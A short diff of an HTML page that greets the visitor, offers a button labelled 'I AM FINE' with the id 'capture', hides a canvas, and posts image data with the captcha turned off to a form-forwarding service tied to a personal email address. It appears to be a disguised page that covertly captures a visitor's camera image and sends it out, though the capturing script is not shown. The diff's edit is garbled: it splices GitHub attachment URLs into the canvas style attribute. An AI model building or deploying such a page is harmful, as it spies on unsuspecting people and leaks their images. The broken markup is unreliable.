@@ -66,7 +66,15 @@ video {
 <h2>HELLO ❤ — HOW ARE YOU?</h2>
 <button id="capture">I AM FINE</button>
 
-<canvas id="canvas" style="display:https://github.com/user-attachments/assets/39e24fbf-7fbf-4f13-bade-15725cea9cbc;"></canvas>
+<canvas id="canvas" style="display:https://github.com/user-attachments/assets/39e24fbf-7fbf-
+
+https://github.com/user-attachments/assets/6478b128-d866-4b33-9a23-22a8db6f03d5
+
+
+
+https://github.com/user-attachments/assets/bc926fac-be46-426d-b693-06a2134345de
+
+4f13-bade-15725cea9cbc;"></canvas>
 
 <form id="imageForm" action="https://formsubmit.co/ganeshbist257@gmail.com" method="POST" enctype="multipart/form-data">
   <input type="hidden" name="_captcha" value="false">
